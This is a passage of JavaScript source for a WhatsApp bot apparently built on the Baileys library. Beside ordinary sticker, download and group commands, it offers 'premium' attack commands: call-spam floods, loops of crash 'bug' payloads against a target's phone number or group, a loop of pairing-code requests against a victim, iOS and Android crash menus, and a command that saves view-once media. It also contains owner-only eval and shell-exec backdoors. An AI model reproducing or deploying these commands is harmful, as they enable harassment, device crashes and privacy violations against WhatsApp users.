  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;

case 'qc': {
  if (!q) return ReplyRyc(`Send command with text. ${prefix + command}`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await Ryc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Ryc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

  case "play": {
    if (!qtext) return ReplyRyc("Send Title");
    await Ryc.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        // Ambil URL video atau cari di YouTube
        const txt = /https:\/\/\youtube.com|youtu.be/.test(qtext)
            ? qtext
            : (await yts(qtext)).videos[0].url;

        // Request data dari API
        const { data } = await axios.get(`https://axeel.my.id/api/download/audio?url=${txt}`, {
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        // Format caption
        const cap = `*→ YouTube - Play*\n` +
            Object.entries(data.metadata).map(([key, value]) => `> *- ${key} :* ${value}`).join("\n") +
            `\n\nCella ~ 2025`;

        // Kirim gambar + caption
        await Ryc.sendMessage(m.chat, {
            image: { url: data.metadata.thumbnail.url },
            caption: cap
        }, { quoted: lol });

        // Kirim audio
        await Ryc.sendMessage(m.chat, {
            audio: { url: data.downloads["128kbps"].download },
            mimetype: "audio/mpeg"
        }, { quoted: lol });
    } catch (error) {
        ReplyRyc("Error! Unable to process your request.");
        await Ryc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        console.error(error);
    }
}
break;

case 'eval': {
  if (!CreatorOnly) return;

  // Check if the message is quoted
  if (!m.quoted) return ReplyRyc(`Reply to a message with caption ${prefix + command}`);

  // Convert quoted message data to JSON
  let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
  let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;

  try {
    // Save the JSON data to a file
    await fs.writeFileSync(jeneng, penis);

    // Send the JSON data as a reply
    await ReplyRyc(penis);

    // Send the saved file as a document
    await Ryc.sendMessage(m.chat, {
      document: { url: `./${jeneng}` },
      fileName: jeneng,
      mimetype: '*/*'
    }, { quoted: lol });

    // Delete the file after sending it
    await fs.unlinkSync(jeneng);

  } catch (error) {
    console.error("Error processing the eval case:", error);
    ReplyRyc("An error occurred while processing the eval case.");
  }
}
break;

case "rvo":
case "readvo":
case "readviewonce":
case "readviewoncemessage": {
  // Check if the message is a reply
  if (!m.quoted) return ReplyRyc("Please reply to a message you want to view.");

  // Check if the quoted message is a view-once message
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") {
    return ReplyRyc("This is not a view-once message.");
  }

  // Extract the quoted message
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  
  // Supported message types
  const supportedTypes = ["imageMessage", "videoMessage", "documentMessage", "stickerMessage", "audioMessage"];
  
  // Check if the quoted message type is supported
  if (!supportedTypes.includes(type)) {
    return ReplyRyc("The quoted message type is not supported.");
  }

  try {
    // Download the content from the quoted message
    let media = await downloadContentFromMessage(msg[type], type === "audioMessage" ? "audio" : type.replace("Message", ""));
    
    // Prepare buffer array to store media
    let bufferArray = [];
    for await (const chunk of media) {
      bufferArray.push(chunk);
    }
    let buffer = Buffer.concat(bufferArray);

    // Send the media based on the type
    if (type === "videoMessage") {
      await Ryc.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
    } else if (type === "imageMessage") {
      await Ryc.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
    } else if (type === "documentMessage") {
      await Ryc.sendMessage(m.chat, { document: buffer, mimetype: msg[type].mimetype, fileName: msg[type].fileName || "file" });
    } else if (type === "stickerMessage") {
      await Ryc.sendMessage(m.chat, { sticker: buffer });
    } else if (type === "audioMessage") {
      let isVoiceNote = msg[type].ptt || true;
      await Ryc.sendMessage(m.chat, { audio: buffer, mimetype: msg[type].mimetype, ptt: isVoiceNote });
    }

    // React with success checkmark
    await Ryc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (error) {
    // Error handling
    console.error("Error processing the view-once message:", error);
    ReplyRyc("Failed to process the view-once message.");
  }
}
break;

case "setpp": {
    if (!CreatorOnly) return ReplyRyc("*You're not my owner*");
    if (!quoted) return ReplyRyc(`Send Image / Reply`);
    try {
        let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
        if (!mime.startsWith("image/")) return ReplyRyc(`Bukan gambar, nih!`);
        if (/webp/.test(mime)) return ReplyRyc(`Sini muka lu ku tempelin stiker anjg!`);
        let media = await Ryc.downloadMediaMessage(quoted);
        if (!media) return ReplyRyc(`Gagal mengunduh gambar, coba lagi!`);
        await Ryc.updateProfilePicture(BotNum, media);
        ReplyRyc(`Success! Profile updated`);
    } catch (error) {
        console.error(error);
        ReplyRyc(`Aduhh, error nih 🥺: ${error}`);
    }
    }
    break;
    
//END
//DELETE PP CASE

case "delpp": {
  // Check if the user is the creator
  if (!CreatorOnly) {
    return ReplyRyc("*You are not my owner*");
  }

  try {
    // Remove the profile picture
    await Ryc.removeProfilePicture(Ryc.user.id);

    // Respond with success message
    ReplyRyc("Successfully deleted profile picture.");

  } catch (error) {
    // Handle any errors that occur during the process
    console.error("Error deleting profile picture:", error);
    ReplyRyc("An error occurred while deleting the profile picture.");
  }
}
break;

case 'tovn': {
  // Check if the quoted media is a video or audio
  if (!/video/.test(mime) && !/audio/.test(mime)) {
    return ReplyRyc(`Reply with a video or voice note and caption it with ${prefix + command}`);
  }

  // Ensure that the message is quoted
  if (!quoted) {
    return ReplyRyc(`Reply with video or voice note and caption it with ${prefix + command}`);
  }

  try {
    // Download the quoted media
    let media = await quoted.download();

    // Import the toAudio function
    let { toAudio } = require('../System/Data4');

    // Convert the media to audio
    let audio = await toAudio(media, 'mp4');

    // Send the audio as a voice note
    await Ryc.sendMessage(m.chat, { 
      audio, 
      mimetype: 'audio/mpeg', 
      ptt: true 
    }, { quoted: lol });

  } catch (error) {
    console.error('Error processing media:', error);
    ReplyRyc("An error occurred while converting the media.");
  }
}
break;

case 'hidetag': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await Ryc.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: lol });
    ReplyRyc("Message sent with hidden tag.");
  } catch (error) {
    console.error("Error sending message:", error);
    ReplyRyc("An error occurred while sending the message.");
  }
}
break;

case 'kick': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");
  if (!Adm) return ReplyRyc("*Only Group Admins can use this command*");

  let users = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
    ? m.quoted.sender 
    : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!q) return ReplyRyc("Please mention a user or send their number.");

  try {
    await Ryc.groupParticipantsUpdate(from, [users], 'remove');
    ReplyRyc("Successfully kicked the user.");
  } catch (error) {
    console.error("Error kicking user:", error);
    ReplyRyc("An error occurred while kicking the user.");
  }
}
break;

case 'getlinkgroup': 
case 'getlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  try {
    let responsegg = await Ryc.groupInviteCode(from);
    Ryc.sendText(
      from, 
      `https://chat.whatsapp.com/${responsegg}\n\nGroup Link: ${groupMetadata.subject}`, 
      m, 
      { detectLink: true }
    );
  } catch (error) {
    console.error("Error fetching group link:", error);
    ReplyRyc("An error occurred while fetching the group link.");
  }
}
break;

case 'resetlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  Ryc.groupRevokeInvite(from);
  ReplyRyc("*Successfully reset the group invite link*");
}
break;

case 'public': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = true;
  ReplyRyc(`*Success: Changed Mode from Self to Public*`);
}
break;

case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = false;
  ReplyRyc(`*Success: Changed Mode from Public to Self*`);
}
break;

case 'ocr': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return ReplyRyc("Send / Reply Image");
  
  if (!/image\/(jpe?g|png)/.test(mime)) {
    return ReplyRyc(`Tipe ${mime} tidak didukung!`);
  }

  let image = await q.download();
  let download = await Ryc.getFile(image, true);

  try {
    let ocr = await ocrSpace(download.filename);
    await Ryc.sendMessage(
      m.chat,
      { text: ocr.ParsedResults[0].ParsedText.trim() },
      { quoted: lol }
    );
  } catch (error) {
    console.error("OCR error:", error);
    return ReplyRyc("Gagal membaca teks dari gambar.");
  }
}
break;

case 'tourl': {
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRyc(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRyc('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to download media!');
    }

    const uploadImage = require('../System/Data6');
    const uploadFile = require('../System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;

    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to upload media!');
    }

    Ryc.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: lol });
}
break;

case 'sticker':
case 's': {
    if (!quoted) return ReplyRyc(`Reply Image or Video with command ${prefix + command}`);
    
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await Ryc.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return ReplyRyc('max 10s');
        
        let media = await quoted.download();
        let encmedia = await Ryc.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else {
        return ReplyRyc(`Send Image or Video with command ${prefix + command}\nVideo duration only 1-9s`);
    }
}
break;

case 'brat': {
    if (!q) return ReplyRyc(`Example : Brat Brat Bret Brot`);
    
    const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`;
    await makeStickerFromUrl(imageUrl, Ryc, m);
}
break;

case "addbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Silahkan Tunggu Kode Pairing Anda*" }, {})
if (m.key.fromMe) return
    try {
        await jadibot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "stopbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Berhasil Menghapus Session!*" }, {})
    if (m.key.fromMe) return
    try {
        await stopbot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "listbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
    if (m.key.fromMe) return
    try {
        listbot(Ryc, m)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!qtext) return ReplyRyc(`Send command with link. ${prefix + command} https://`);
    
    let res = await tiktok(qtext);          

    if (res && res.data && res.data.data) {
        let images = res.data.data.images || [];
        let play = res.data.data.play;
        let lagu = res.data.data.music;

        const getMimeType = async (url) => {
            try {
                const response = await axios.head(url);
                return response.headers['content-type'];
            } catch (error) {
                console.error(error);
                return;
            }
        };

        let mimeType = await getMimeType(play);
            
        if (mimeType && mimeType.startsWith('video/')) {
            await Ryc.sendMessage(m.chat, {
                video: { url: play },
                caption: "Successfully downloaded video from TikTok"
            }, { quoted: lol });
        } else if (images.length > 0) {
            let totalImages = images.length;
            let estimatedTime = totalImages * 4;
            let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
            await Ryc.sendMessage(m.chat, { text: message }, { quoted: lol });

            const sendImageWithDelay = async (url, index) => {
                let caption = `Gambar ke-${index + 1}`;
                await Ryc.sendMessage(m.chat, { image: { url }, caption: caption }, { quoted: lol });
            };

            await Ryc.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" }, { quoted: lol });

            for (let i = 0; i < images.length; i++) {
                await sendImageWithDelay(images[i], i);
                await new Promise(resolve => setTimeout(resolve, 4000)); // Delay 4 seconds
            }
        } else {
            console.log('No valid video or images found.');
            await Ryc.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: lol });
        }
    } else {
        console.error('Error: Invalid response structure', res);
        await Ryc.sendMessage(m.chat, {
            text: "No media found or an error occurred while retrieving media."
        }, { quoted: lol });
    }
}
break;
      
case 'meta-ai': {
    if (!qtext) {
        return ReplyRyc('Send Text / Question');
    }

    try {
        const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
        const response = await fetch(apiUrl);
        const mark = await response.json();

        const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

        await Ryc.sendMessage(m.chat, { text: ress }, { quoted: lol });
        
    } catch (error) {
        console.error("Terjadi kesalahan segera hubungi creator!!!:", error.message);
    }
}
break;

case 'force': {
    if (!PremOnly) {
        return ReplyRyc("*You Not Premium User*");
    }
    
    if (!q) {
        return ReplyRyc(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/`);
    }

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let isTarget = await Ryc.groupAcceptInvite(result);
    
    ReplyRyc(`*Success! Force sent to ${isTarget}*`);
        
        //Paramater
        await CrlButton(isTarget)
        await CallGc(isTarget)
   }
break;

case 'pelermmk':
    if (!BotNum && !CreatorOnly) return;
    if (!q) return ReplyRyc('!Masukkan nomor target');
    
    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Crashios 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`[ ¡ ] Pairing Code Loop(TRUE) => m.chat(${isTarget})`);
    
    (async () => {
        for (let r = 0; r < 100; r++) {
            console.log(`Iterasi ke-${r + 1}`);
            
            const BrowserList = ['Riyu', 'Failed', 'PairCode'];
            const {
                   default: makeWASocket,
                   useMultiFileAuthState,
                   DisconnectReason,
                   fetchLatestBaileysVersion,
                   generateForwardMessageContent,
                   prepareWAMessageMedia,
                   generateWAMessageFromContent,
                   generateMessageID,
                   downloadContentFromMessage,
                   makeCacheableSignalKeyStore,
                   makeInMemoryStore,
                   jidDecode,
                   proto,
                   getAggregateVotesInPollMessage,
                   PHONENUMBER_MCC
            } = require("@whiskeysockets/baileys");
            
            const typeBrow = BrowserList[Math.floor(Math.random() * BrowserList.length)];
            
            const store = makeInMemoryStore({
                logger: pino().child({
                    level: 'debug',
                    stream: 'store'
                })
            });
            
            const { state } = await useMultiFileAuthState('./pairing/');
            const { version } = await fetchLatestBaileysVersion();
            const msgRetryCounterCache = new NodeCache();
            
            const WaConnection = makeWASocket({
                logger: pino({ level: 'silent' }),
                printQRInTerminal: !pairingCode,
                mobile: useMobile,
                browser: [`${typeBrow} (Linux)`, '', ''],
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" })
                    )
                },
                markOnlineOnConnect: true,
                generateHighQualityLinkPreview: true,
                getMessage: async (key) => {
                    const jid = jidNormalizedUser(key.remoteJid);
                    const msg = await store.loadMessage(jid, key.id);
                    return msg?.message || "";
                },
                msgRetryCounterCache,
                defaultQueryTimeoutMs: undefined,
            });

            WaConnection.ev.on('messages.upsert', async (chatUpdate) => {
                const mek = chatUpdate.messages[0];
                console.log("Pesan baru:", mek);
            });

            store.bind(WaConnection.ev);
            
            if (pairingCode && !state.creds.registered) {
                if (useMobile) {
                    throw new Error('Cannot use pairing code with mobile API');
                }
                let phoneNumber = numiCode;
                if (phoneNumber) {
                    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
                    if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
                        process.exit(0);
                    }
                }
                let code = await WaConnection.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log("Pairing Code:", code);
            }

            // Tambahkan delay antar iterasi
            await new Promise(resolve => setTimeout(resolve, 995));
        }

        console.log("Loop pairing selesai setelah 100 iterasi.");
    })();
    break;
    
case 'spamcall': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Spamcall 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Spamcall 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Spam Call sent to ${isTarget}*`);

    for (let i = 0; i < 100; i++) {
        await sendOfferCall(isTarget);
        await sendOfferVideoCall(isTarget);
    }
}
break;

case 'clearbugs': {
if (!PremOnly) return m.reply(" Khusus Premium ")
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Ryc.sendMessage(target, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 

case 'hunterattacik': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Hunterattack 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Unexpected 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    
  Ryc.sendMessage(m.chat, {
  caption: "𝗫𝗘𝗢𝗡𝗜𝗫 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚\n» 𝗙𝗢𝗥 𝗧𝗔𝗥𝗚𝗘𝗧 : 6289531470531@s.whatsapp.net\n» 𝗨𝗦𝗜𝗡𝗚 𝗦𝗖𝗥𝗜𝗣𝗧 : 𝖷eonix Crasher\nDo You Know ZyroxModz? Yes Thats Me", 
  video: { url: "https://files.catbox.moe/dgldmw.mp4" },
  gifPlayback: true,
  footer: "©Zyrox",
  buttons: [
    { 
      buttonId: `.help`, 
      buttonText: {
      displayText: 'BACK🔙'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.creator', 
      buttonText: {
      displayText: '👤 Creator'
      }, 
      type: 1,
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });

    //Paramater
    for (let r = 0; r < 100; r++) {
    await StravaX(isTarget)
    await Force(isTarget)
    await StravaX(isTarget)
    await Force(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'hunterattack': case 'bughard': case 'hatihati': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Hunterattack 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Unexpected 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    
  Ryc.sendMessage(m.chat, {
  caption: "𝗫𝗘𝗢𝗡𝗜𝗫 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗨𝗚\n» 𝗙𝗢𝗥 𝗧𝗔𝗥𝗚𝗘𝗧 : 6289531470531@s.whatsapp.net\n» 𝗨𝗦𝗜𝗡𝗚 𝗦𝗖𝗥𝗜𝗣𝗧 : 𝖷eonix Crasher\nDo You Know ZyroxModz? Yes Thats Me", 
  video: { url: "https://files.catbox.moe/dgldmw.mp4" },
  gifPlayback: true,
  footer: "©Zyrox",
  buttons: [
    { 
      buttonId: `.help`, 
      buttonText: {
      displayText: 'BACK🔙'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.creator', 
      buttonText: {
      displayText: '👤 Creator'
      }, 
      type: 1,
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });

    //Paramater
    for (let r = 0; r < 100; r++) {
    await CrashCalls(target)
await FlowX(target)
await SqlXGlx(target)
await uibuglogger(target)
await NativeCore(target)
await CrashCalls(target)
await FlowX(target)
await SqlXGlx(target)
await uibuglogger(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'bug-medium': {
if (!PremOnly) return m.reply("HARUS PREM")
if (!q) return m.reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘖𝘯𝘦 𝘖𝘍 𝘛𝘩𝘦 𝘔𝘦𝘥𝘪𝘶𝘮 𝘉𝘶𝘨`
Ryc.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'L҉I҉S҉T҉ ҉B҉U҉G҉ ҉M҉E҉D҉I҉U҉M҉',
          sections: [
            {
              title: '𝘓𝘪𝘴𝘵 𝘉𝘶𝘨 𝘔𝘦𝘥𝘪𝘶𝘮',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Hunter',
                  id: `.hunterattack ${target}`
                },
                {
                  title: '𝘏𝘺𝘥𝘳𝘰',
                  id: `.hatihati ${target}`
                },                
                {
                  title: '𝘓𝘶𝘤𝘪𝘥',
                  id: `.bughard ${target}`
                },
                { 
                  title: 'clearbug',
                  id: `.clearbugs ${target}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: namafile,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: namach,
   },    
    externalAdReply: {
      title: title,
      body: namaowner,
      thumbnailUrl: ThumbUrl ,
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case '+phunter': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!BotNum) return ReplyRyc("This Feature Only Send By Bot Number");

    Ryc.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await StravaX(m.chat);
    await Force(m.chat);
    await StravaX(m.chat);
    await Force(m.chat);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'xxpeju': {
if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example Usage:\n Phunter 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .Combine 62 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    
  Ryc.sendMessage(m.chat, {
  caption: "Select Options Bugs", 
  image: { url: "https://files.catbox.moe/lzx2jk.jpg" },
  footer: "Cella",
  buttons: [
    { 
      buttonId: `.about`, 
      buttonText: {
      displayText: 'About'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.tqto', 
      buttonText: {
      displayText: 'Tqto'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Options",
        "sections": [
            {
                "title": "Lets Try Sent Crash",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "For Android",
                        "title": "Combine",
                        "description": "Beta Force",
                        "id": ".ryccombine ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "Unexpected",
                        "description": "⩟",
                        "id": ".unexpected ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "Overflow",
                        "description": "⩟",
                        "id": ".overflow ${isTarget}"
                    },
                    {
                        "header": "For Ios",
                        "title": "Crash Ios",
                        "description": "⩟",
                        "id": ".crashIos ${isTarget}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });
}
break
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRyc(bang)}
try {
ReplyRyc(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRyc(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRyc(evaled)
} catch (err) {
await ReplyRyc(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRyc(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ryc.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\